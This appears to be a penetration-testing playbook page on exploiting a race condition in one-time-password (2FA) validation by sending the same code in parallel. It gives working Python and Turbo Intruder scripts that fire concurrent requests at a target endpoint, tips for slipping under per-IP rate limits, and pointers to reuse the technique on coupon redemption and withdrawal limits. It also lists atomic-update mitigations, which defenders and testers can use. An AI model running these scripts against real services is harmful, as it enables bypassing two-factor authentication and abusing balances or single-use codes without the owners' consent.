# 2FA — Race Condition on OTP Validation

## When this applies

- The OTP verification has non-atomic check-and-mark-used logic.
- Concurrent requests with the same OTP can both pass the validation step before either marks it as consumed.
- Common with database-backed `used_codes` lists where SELECT/UPDATE is not transactional.

## Technique

Submit multiple parallel verification requests with the same valid OTP. If validation reads the "is this code used?" state but doesn't atomically mark it used until the END of processing, two threads may both read `used=false`, both proceed, both succeed.

This is a TOCTOU (time-of-check-to-time-of-use) bug applied to OTP verification.

## Steps

### 1. Get a valid OTP

```python
otp = get_current_otp()    # From email/SMS/authenticator
```

### 2. Submit identical OTP in parallel

```python
import concurrent.futures, requests

def submit_otp():
    return requests.post('https://target.com/verify-2fa',
                         json={'username':'test','otp':otp},
                         cookies=session_cookies)

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    futures = [ex.submit(submit_otp) for _ in range(20)]
    results = [f.result() for f in futures]

successful = sum(1 for r in results if r.status_code == 200)
print(f"Successful: {successful}")
if successful > 1:
    print("[!] Race condition — multiple submissions succeeded")
```

### 3. Use Turbo Intruder for high precision

Burp's Turbo Intruder allows microsecond-precise parallel sends:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20,
                            requestsPerConnection=1, pipeline=False)
    for i in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

Set `concurrentConnections=20`, all hits the same endpoint with the same OTP.

### 4. Check outcomes

After the parallel salvo, inspect:
- HTTP status of each response (multiple 200s = race won).
- Distinct session cookies issued (each successful response sets its own).
- The OTP's "used" state in subsequent attempts (1 used vs reusable).

### 5. Race against rate limiting

If rate limiting is per-IP, parallelism within the same IP may still trigger 429 on the Nth request. The race needs to win in the first N requests:

```python
# 5 requests in parallel — fast enough to slip past rate limiter
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
    futures = [ex.submit(submit_otp) for _ in range(5)]
```

### 6. Apply to other auth-related operations

The same race-condition primitive works on:
- Account creation with the same username (uniqueness check vs INSERT).
- Coupon / voucher redemption (single-use codes).
- Withdrawal limits (balance check vs deduct).
- Friend request acceptance.

### 7. HTTP/2 multiplexing for ultimate precision

HTTP/2 allows multiple requests in a single packet (single-packet attack):

```bash
# Use http2-attacker / Burp Suite "Send group in single packet"
# Sends all requests in one TCP packet → arrives at server simultaneously
```

## Verifying success

- Multiple 200 responses for the same OTP.
- Multiple session cookies issued (each starts an independent authenticated session).
- The OTP is now "used" (subsequent solo attempts fail).

## Common pitfalls

- Atomic operations (`SELECT ... FOR UPDATE`, `UPDATE ... WHERE used=false`) prevent races.
- Modern frameworks (Django auth, Spring Security) use transactional OTP validation.
- Network jitter may cause the race window to be smaller than expected — increase parallelism.
- WAF rate limiting may block parallel attempts before reaching backend.
- Session-level locking (one OTP attempt per session at a time) prevents the race.

## Tools

- Burp Suite Turbo Intruder (precision-timed parallel attacks).
- Burp Repeater "Send group in single packet" (HTTP/2).
- Custom Python with `threading` / `asyncio`.
- Race condition tooling like `racepwn`.
